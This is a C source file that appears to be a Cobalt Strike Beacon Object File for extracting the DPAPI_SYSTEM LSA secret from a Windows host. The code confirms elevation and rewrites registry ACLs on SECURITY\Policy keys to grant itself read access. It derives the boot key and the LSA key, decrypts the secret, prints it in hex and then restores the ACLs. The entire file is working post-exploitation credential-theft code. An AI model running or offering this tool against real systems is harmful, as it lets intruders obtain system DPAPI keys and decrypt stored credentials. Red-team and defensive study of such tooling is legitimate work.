#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

PSECURITY_DESCRIPTOR g_originalAcls[2] = {NULL, NULL};
const char* g_lsaRegKeys[] = {
    "SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM\\CurrVal",
    "SECURITY\\Policy\\PolEKList"
};


void StringToByteArray(const char* hex, BYTE* bytes, DWORD len) {
    if((len % 2) != 0) return;
    for (DWORD i = 0; i < len; i++) {
        char temp[3] = {hex[i * 2], hex[i * 2 + 1], 0};
        BYTE value = 0;
        
        for (int j = 0; j < 2; j++) {
            char c = temp[j];
            BYTE nibble = 0;
            
            if (c >= '0' && c <= '9') {
                nibble = c - '0';
            } else if (c >= 'A' && c <= 'F') {
                nibble = c - 'A' + 10;
            } else if (c >= 'a' && c <= 'f') {
                nibble = c - 'a' + 10;
            }
            
            value = (value << 4) | nibble;
        }
        
        bytes[i] = value;
    }
}

//str is assumed to be pre-allocated and can contain the value in bytes
void ByteArrayToString(const BYTE* bytes, DWORD len, char* str) {
    const char* hexChars = "0123456789abcdef";
    
    for (DWORD i = 0; i < len; i++) {
        str[i * 2] = hexChars[(bytes[i] >> 4) & 0xF];
        str[i * 2 + 1] = hexChars[bytes[i] & 0xF];
    }
    str[len * 2] = '\0';
}


void LSASHA256Hash(const BYTE* key, DWORD keyLen, const BYTE* rawData, DWORD rawDataLen, BYTE* hash) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status;
    
    status = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        internal_printf("[!] BCryptOpenAlgorithmProvider (SHA256) failed: 0x%08lX\n", status);
        goto cleanup;
    }
    status = BCRYPT$BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    if (!BCRYPT_SUCCESS(status)) {
        internal_printf("[!] BCryptCreateHash failed: 0x%08lX\n", status);
        goto cleanup;
    }
    status = BCRYPT$BCryptHashData(hHash, (PUCHAR)key, keyLen, 0);
    if (!BCRYPT_SUCCESS(status)) {
        internal_printf("[!] BCryptHashData (key) failed: 0x%08lX\n", status);
        goto cleanup;
    }
    for (int i = 0; i < 1000; i++) {
        status = BCRYPT$BCryptHashData(hHash, (PUCHAR)rawData, rawDataLen, 0);
        if (!BCRYPT_SUCCESS(status)) {
            internal_printf("[!] BCryptHashData (iteration %d) failed: 0x%08lX\n", i, status);
            goto cleanup;
        }
    }
    status = BCRYPT$BCryptFinishHash(hHash, hash, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        internal_printf("[!] BCryptFinishHash failed: 0x%08lX\n", status);
    }

cleanup:
    if (hHash) {
        BCRYPT$BCryptDestroyHash(hHash);
    }
    if (hAlg) {
        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    }
}

BOOL LSAAESDecrypt(const BYTE* key, const BYTE* data, DWORD dataLen, BYTE** plaintext, DWORD* plaintextLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL success = FALSE;
    BYTE* buffer = NULL;
    

    status = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        internal_printf("[!] BCryptOpenAlgorithmProvider failed: 0x%08lX\n", status);
        goto cleanup;
    }
    status = BCRYPT$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, 
                              sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        internal_printf("[!] BCryptSetProperty (CBC mode) failed: 0x%08lX\n", status);
        goto cleanup;
    }
    DWORD chunks = (dataLen + 15) / 16;
    *plaintextLen = chunks * 16;
    buffer = (BYTE*)intAlloc(*plaintextLen);
    if (!buffer) {
        internal_printf("[!] Failed to allocate memory for plaintext\n");
        goto cleanup;
    }
    // Process each 16-byte chunk separately with fresh key and zero IV
    // This is specific to how LSA is handled
    BOOL allChunksSuccess = TRUE;
    
    for (DWORD i = 0; i < chunks && allChunksSuccess; i++) {
        DWORD offset = i * 16;
        BYTE chunk[16];
        BYTE decryptedChunk[16];
        ULONG decryptedChunkLen = 0;
        MSVCRT$memset(chunk, 0, 16);
        
        DWORD copyLen = (offset + 16 <= dataLen) ? 16 : dataLen - offset;
        for (DWORD j = 0; j < copyLen; j++) {
            chunk[j] = data[offset + j];
        }
        // Create a fresh key for this chunk (this resets internal state)
        status = BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0);
        if (!BCRYPT_SUCCESS(status)) {
            internal_printf("[!] BCryptGenerateSymmetricKey failed for chunk %lu: 0x%08lX\n", i, status);
            allChunksSuccess = FALSE;
            break;
        }
        // Decrypt chunk with fresh zero IV
        BYTE iv[16] = {0};
        status = BCRYPT$BCryptDecrypt(hKey, chunk, 16, NULL, iv, sizeof(iv), 
                              decryptedChunk, 16, &decryptedChunkLen, 0);
        
        if (BCRYPT_SUCCESS(status)) {
            // Copy the decrypted chunk to the output buffer - manual memcpy
            MSVCRT$memcpy(buffer + offset, decryptedChunk, 16);
        } else {
            internal_printf("[!] BCryptDecrypt failed for chunk %lu: 0x%08lX\n", i, status);
            allChunksSuccess = FALSE;
        }
        
        // Cleanup key for this chunk
        if (hKey) {
            BCRYPT$BCryptDestroyKey(hKey);
            hKey = NULL;
        }
        
        if (!allChunksSuccess) break;
    }
    
    if (allChunksSuccess) {
        *plaintext = buffer;
        buffer = NULL;
        success = TRUE;
    }

cleanup:
    if (buffer) {
        intFree(buffer);
    }
    if (hKey) {
        BCRYPT$BCryptDestroyKey(hKey);
    }
    if (hAlg) {
        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    
    return success;
}

BOOL IsHighIntegrity() {
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation = {0};
    DWORD dwSize = 0;
    
    if (!KERNEL32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        goto cleanup;
    }
    
    if (!ADVAPI32$GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        goto cleanup;
    }
    
    isElevated = elevation.TokenIsElevated;

cleanup:
    if (hToken) {
        KERNEL32$CloseHandle(hToken);
    }
    
    return isElevated;
}

BOOL ModifyRegistryPermissions(BOOL enable) {
    HANDLE hToken = NULL;
    PTOKEN_USER pTokenUser = NULL;
    DWORD tokenInfoLength = 0;
    BOOL success = FALSE;
    HKEY hKey = NULL;
    PSECURITY_DESCRIPTOR pNewSD = NULL;
    PACL pNewDacl = NULL;
    
    if (enable) {
        internal_printf("[+] Modifying registry permissions to enable LSA secret access\n");
        
        if (!KERNEL32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            internal_printf("[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
            goto cleanup;
        }
        
        ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLength);
        
        pTokenUser = (PTOKEN_USER)intAlloc(tokenInfoLength);
        if (!pTokenUser) {
            goto cleanup;
        }
        
        if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoLength, &tokenInfoLength)) {
            internal_printf("[!] Failed to get token information: %lu\n", KERNEL32$GetLastError());
            goto cleanup;
        }
        
        for (int i = 0; i < 2; i++) {
            LONG result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, g_lsaRegKeys[i], 0, 
                                      READ_CONTROL | WRITE_DAC, &hKey);
            
            if (result != ERROR_SUCCESS) {
                internal_printf("[!] Failed to open registry key %s for permission modification: %ld\n", 
                       g_lsaRegKeys[i], result);
                goto cleanup;
            }
            
            DWORD secDescSize = 0;
            result = ADVAPI32$RegGetKeySecurity(hKey, DACL_SECURITY_INFORMATION, NULL, &secDescSize);
            
            if (result != ERROR_INSUFFICIENT_BUFFER) {
                internal_printf("[!] Failed to get security descriptor size for %s: %ld\n", 
                       g_lsaRegKeys[i], result);
                goto cleanup;
            }
            
            g_originalAcls[i] = (PSECURITY_DESCRIPTOR)intAlloc(secDescSize);
            if (!g_originalAcls[i]) {
                goto cleanup;
            }
            
            result = ADVAPI32$RegGetKeySecurity(hKey, DACL_SECURITY_INFORMATION, 
                                     g_originalAcls[i], &secDescSize);
            
            if (result != ERROR_SUCCESS) {
                internal_printf("[!] Failed to get security descriptor for %s: %ld\n", 
                       g_lsaRegKeys[i], result);
                goto cleanup;
            }
            PACL pOldDacl = NULL;
            BOOL bDaclPresent = FALSE;
            BOOL bDaclDefaulted = FALSE;
            
            if (!ADVAPI32$GetSecurityDescriptorDacl(g_originalAcls[i], &bDaclPresent, 
                                         &pOldDacl, &bDaclDefaulted)) {
                internal_printf("[!] Failed to get DACL from security descriptor: %lu\n", KERNEL32$GetLastError());
                goto cleanup;
            }
            
            EXPLICIT_ACCESSA ea = {0};
            ea.grfAccessPermissions = KEY_READ;
            ea.grfAccessMode = GRANT_ACCESS;
            ea.grfInheritance = NO_INHERITANCE;
            ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
            ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
            ea.Trustee.ptstrName = (LPSTR)pTokenUser->User.Sid;
            
            DWORD dwRes = ADVAPI32$SetEntriesInAclA(1, &ea, pOldDacl, &pNewDacl);
            if (dwRes != ERROR_SUCCESS) {
                internal_printf("[!] Failed to create new ACL: %lu\n", dwRes);
                goto cleanup;
            }
            
            pNewSD = (PSECURITY_DESCRIPTOR)intAlloc(SECURITY_DESCRIPTOR_MIN_LENGTH);
            if (!pNewSD) {
                goto cleanup;
            }
            
            if (!ADVAPI32$InitializeSecurityDescriptor(pNewSD, SECURITY_DESCRIPTOR_REVISION)) {
                internal_printf("[!] Failed to initialize security descriptor: %lu\n", KERNEL32$GetLastError());
                goto cleanup;
            }
            
            if (!ADVAPI32$SetSecurityDescriptorDacl(pNewSD, TRUE, pNewDacl, FALSE)) {
                internal_printf("[!] Failed to set security descriptor DACL: %lu\n", KERNEL32$GetLastError());
                goto cleanup;
            }
            
            result = ADVAPI32$RegSetKeySecurity(hKey, DACL_SECURITY_INFORMATION, pNewSD);
            if (result != ERROR_SUCCESS) {
                internal_printf("[!] Failed to set registry key security for %s: %ld\n", 
                       g_lsaRegKeys[i], result);
                goto cleanup;
            }
            
            internal_printf("[+] Successfully modified permissions for %s\n", g_lsaRegKeys[i]);
            
            if (pNewSD) {
                intFree(pNewSD);
                pNewSD = NULL;
            }
            if (pNewDacl) {
                KERNEL32$LocalFree(pNewDacl);
                pNewDacl = NULL;
            }
            if (hKey) {
                ADVAPI32$RegCloseKey(hKey);
                hKey = NULL;
            }
        }
        
        success = TRUE;
        
    } else {
        internal_printf("[+] Restoring original registry permissions\n");
        for (int i = 0; i < 2; i++) {
            if (g_originalAcls[i]) {
                LONG result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, g_lsaRegKeys[i], 0, 
                                          WRITE_DAC, &hKey);
                
                if (result == ERROR_SUCCESS) {
                    result = ADVAPI32$RegSetKeySecurity(hKey, DACL_SECURITY_INFORMATION, 
                                             g_originalAcls[i]);
                    if (result == ERROR_SUCCESS) {
                        internal_printf("[+] Successfully restored permissions for %s\n", g_lsaRegKeys[i]);
                    } else {
                        internal_printf("[!] Failed to restore permissions for %s: %ld\n", 
                               g_lsaRegKeys[i], result);
                    }
                    ADVAPI32$RegCloseKey(hKey);
                    hKey = NULL;
                }
                
                intFree(g_originalAcls[i]);
                g_originalAcls[i] = NULL;
            }
        }
        success = TRUE;
    }

cleanup:
    if (hToken) {
        KERNEL32$CloseHandle(hToken);
    }
    if (pTokenUser) {
        intFree(pTokenUser);
    }
    if (hKey) {
        ADVAPI32$RegCloseKey(hKey);
    }
    if (pNewSD) {
        intFree(pNewSD);
    }
    if (pNewDacl) {
        KERNEL32$LocalFree(pNewDacl);
    }
    
    return success;
}

BOOL GetRegKeyValue(const char* keyPath, BYTE** data, DWORD* dataSize) {
    HKEY hKey = NULL;
    BYTE* buffer = NULL;
    BOOL success = FALSE;
    DWORD cbData = 0;
    
    LONG result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        internal_printf("[!] Error opening registry key %s: %ld\n", keyPath, result);
        goto cleanup;
    }

    result = ADVAPI32$RegQueryValueExA(hKey, NULL, NULL, NULL, NULL, &cbData);
    if (result != ERROR_SUCCESS) {
        internal_printf("[!] Error querying registry value size for %s: %ld\n", keyPath, result);
        goto cleanup;
    }

    buffer = (BYTE*)intAlloc(cbData);
    if (!buffer) {
        goto cleanup;
    }

    result = ADVAPI32$RegQueryValueExA(hKey, NULL, NULL, NULL, buffer, &cbData);
    if (result != ERROR_SUCCESS) {
        internal_printf("[!] Error reading registry value for %s: %ld\n", keyPath, result);
        goto cleanup;
    }

    *data = buffer;
    *dataSize = cbData;
    buffer = NULL; 
    success = TRUE;

cleanup:
    if (hKey) {
        ADVAPI32$RegCloseKey(hKey);
    }
    if (buffer) {
        intFree(buffer);
    }
    
    return success;
}

BOOL GetBootKey(BYTE* bootkey) {
    const char* keys[] = {"JD", "Skew1", "GBG", "Data"};
    char scrambledKey[33] = {0};
    HKEY hKey = NULL;
    BOOL success = FALSE;
    BYTE skey[16] = {0};
    
    for (int i = 0; i < 4; i++) {
        char keyPath[256];
        char classVal[1024];
        DWORD classLen = sizeof(classVal);
        
        MSVCRT$strcpy(keyPath, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\");
        MSVCRT$strcat(keyPath, keys[i]);
        
        LONG result = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
        if (result != ERROR_SUCCESS) {
            internal_printf("[!] Error opening %s: %ld\n", keyPath, result);
            goto cleanup;
        }
        
        result = ADVAPI32$RegQueryInfoKeyA(hKey, classVal, &classLen, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        if (result != ERROR_SUCCESS) {
            internal_printf("[!] Error querying %s: %ld\n", keyPath, result);
            goto cleanup;
        }
        
        MSVCRT$strcat(scrambledKey, classVal);
        
        ADVAPI32$RegCloseKey(hKey);
        hKey = NULL;
    }
    
    if (MSVCRT$strlen(scrambledKey) != 32) {
        internal_printf("[!] Invalid scrambled key length: %d (expected 32)\n", MSVCRT$strlen(scrambledKey));
        goto cleanup;
    }
    
    StringToByteArray(scrambledKey, skey, 16);
    
    BYTE descramble[] = {0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                         0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7};
    
    for (int i = 0; i < 16; i++) {
        bootkey[i] = skey[descramble[i]];
    }
    
    success = TRUE;

cleanup:
    if (hKey) {
        ADVAPI32$RegCloseKey(hKey);
    }
    
    return success;
}

BOOL GetLSAKey(BYTE* lsaKey) {
    BYTE bootkey[16] = {0};
    char bootkeyHex[48] = {0};
    BYTE* lsaKeyEncryptedStruct = NULL;
    DWORD structSize = 0;
    BYTE* lsaKeyStructPlaintext = NULL;
    DWORD plaintextLen = 0;
    BOOL success = FALSE;
    
    if (!GetBootKey(bootkey)) {
        internal_printf("[!] Failed to get boot key\n");
        goto cleanup;
    }
    ByteArrayToString(bootkey, 16, bootkeyHex);
    internal_printf("[+] Successfully obtained boot key: %s\n", bootkeyHex);
    
    if (!GetRegKeyValue("SECURITY\\Policy\\PolEKList", &lsaKeyEncryptedStruct, &structSize)) {
        internal_printf("[!] Failed to get LSA key encrypted struct\n");
        goto cleanup;
    }
    
    if (structSize < 28) {
        internal_printf("[!] LSA key struct too small: %lu bytes (expected at least 28)\n", structSize);
        goto cleanup;
    }
    
    internal_printf("[+] Successfully read LSA key encrypted struct (%lu bytes)\n", structSize);
    
    DWORD encryptedDataLen = structSize - 28;
    BYTE* lsaEncryptedData = lsaKeyEncryptedStruct + 28;
    
    if (encryptedDataLen < 32) {
        internal_printf("[!] LSA encrypted data too small: %lu bytes (expected at least 32)\n", encryptedDataLen);
        goto cleanup;
    }
    
    BYTE tempKeyData[32];
    BYTE tmpKey[32];
    
    for (int i = 0; i < 32; i++) {
        tempKeyData[i] = lsaEncryptedData[i];
    }
    
    LSASHA256Hash(bootkey, 16, tempKeyData, 32, tmpKey);
    
    BYTE* remainder = lsaEncryptedData + 32;
    DWORD remainderLen = encryptedDataLen - 32;
    
    if (!LSAAESDecrypt(tmpKey, remainder, remainderLen, &lsaKeyStructPlaintext, &plaintextLen)) {
        internal_printf("[!] Failed to decrypt LSA key struct\n");
        goto cleanup;
    }
    
    if (plaintextLen < 68 + 32) {
        internal_printf("[!] Decrypted LSA key struct too small: %lu bytes (expected at least 100)\n", plaintextLen);
        goto cleanup;
    }
    
    // Extract the LSA key from offset 68 - manual memcpy
    for (int i = 0; i < 32; i++) {
        lsaKey[i] = lsaKeyStructPlaintext[68 + i];
    }
    
    success = TRUE;

cleanup:
    if (lsaKeyEncryptedStruct) {
        intFree(lsaKeyEncryptedStruct);
    }
    if (lsaKeyStructPlaintext) {
        intFree(lsaKeyStructPlaintext);
    }
    
    return success;
}


BOOL GetLSASecret(const char* secretName, BYTE** secret, DWORD* secretLen) {
    BYTE lsaKey[32] = {0};
    BYTE* keyData = NULL;
    DWORD keyDataSize = 0;
    BYTE* keyPathPlaintext = NULL;
    DWORD plaintextLen = 0;
    BYTE* result = NULL;
    BOOL success = FALSE;
    
    internal_printf("[+] Attempting to extract LSA secret: %s\n", secretName);
    
    if (!ModifyRegistryPermissions(TRUE)) {
        internal_printf("[!] Failed to modify registry permissions\n");
        goto cleanup;
    }
    
    if (!GetLSAKey(lsaKey)) {
        internal_printf("[!] Failed to get LSA key\n");
        goto cleanup;
    }
    
    internal_printf("[+] Successfully obtained LSA key\n");
    
    char keyPath[256];
    MSVCRT$strcpy(keyPath, "SECURITY\\Policy\\Secrets\\");
    MSVCRT$strcat(keyPath, secretName);
    MSVCRT$strcat(keyPath, "\\CurrVal");
    
    if (!GetRegKeyValue(keyPath, &keyData, &keyDataSize)) {
        internal_printf("[!] Failed to get secret data from registry\n");
        goto cleanup;
    }
    
    if (keyDataSize < 28) {
        internal_printf("[!] Secret data too small: %lu bytes (expected at least 28)\n", keyDataSize);
        goto cleanup;
    }
    
    internal_printf("[+] Successfully read encrypted secret data (%lu bytes)\n", keyDataSize);
    
    DWORD encryptedDataLen = keyDataSize - 28;
    BYTE* keyEncryptedData = keyData + 28;
    
    if (encryptedDataLen < 32) {
        internal_printf("[!] Encrypted data too small: %lu bytes (expected at least 32)\n", encryptedDataLen);
        goto cleanup;
    }
    
    BYTE tempKeyData[32];
    BYTE tmpKey[32];
    
    for (int i = 0; i < 32; i++) {
        tempKeyData[i] = keyEncryptedData[i];
    }
    
    LSASHA256Hash(lsaKey, 32, tempKeyData, 32, tmpKey);
    
    BYTE* remainder = keyEncryptedData + 32;
    DWORD remainderLen = encryptedDataLen - 32;
    
    if (!LSAAESDecrypt(tmpKey, remainder, remainderLen, &keyPathPlaintext, &plaintextLen)) {
        internal_printf("[!] Failed to decrypt secret data\n");
        goto cleanup;
    }
    
    internal_printf("[+] Successfully decrypted secret data (%lu bytes)\n", plaintextLen);
    
    if (MSVCRT$strcmp(secretName, "DPAPI_SYSTEM") == 0) {
        if (plaintextLen < 60) {
            internal_printf("[!] Decrypted DPAPI_SYSTEM data too small: %lu bytes (expected at least 60)\n", plaintextLen);
            goto cleanup;
        }
        
        *secretLen = 40;
        result = (BYTE*)intAlloc(40);
        if (!result) {
            goto cleanup;
        }
        
        MSVCRT$memcpy(result, keyPathPlaintext + 20, 40);
        
        *secret = result;
        result = NULL;
        success = TRUE;
    } else {
        internal_printf("[!] LSA Secret '%s' not implemented!\n", secretName);
        goto cleanup;
    }

cleanup:
    // Restore original registry permissions
    ModifyRegistryPermissions(FALSE);
    
    if (keyData) {
        intFree(keyData);
    }
    if (keyPathPlaintext) {
        intFree(keyPathPlaintext);
    }
    if (result) {
        intFree(result);
    }
    
    return success;
}

void go(char* args, int len) {
    BYTE* secret = NULL;
    DWORD secretLen = 0;
    char hexString[81] = {0};
    BOOL success = FALSE;

	if(!bofstart())
	{
		return;
	}

    internal_printf("DPAPI_SYSTEM LSA Secret Extractor (BOF)\n");
    internal_printf("=======================================\n\n");

    if (!IsHighIntegrity()) {
        internal_printf("[!] You need to be in high integrity to extract LSA secrets!\n");
        internal_printf("[!] Please run this from an elevated Beacon context\n");
        goto cleanup;
    }

    internal_printf("[+] Running in high integrity context\n");

    if (!GetLSASecret("DPAPI_SYSTEM", &secret, &secretLen)) {
        internal_printf("[!] Failed to extract LSA secret\n");
        goto cleanup;
    }

    if (!secret || secretLen < 40) {
        internal_printf("[!] Failed to extract secret or invalid secret length\n");
        goto cleanup;
    }

    internal_printf("[+] Successfully extracted DPAPI_SYSTEM secret!\n");
    
    ByteArrayToString(secret, 40, hexString);
    internal_printf("[+] DPAPI_SYSTEM key: %s\n", hexString);
    
    success = TRUE;

cleanup:
    if (secret) {
        intFree(secret);
        secret = NULL;
    }
    
    if (success) {
        internal_printf("[+] BOF execution completed successfully\n");
    } else {
        internal_printf("[!] BOF execution failed\n");
    }
	printoutput(TRUE);
}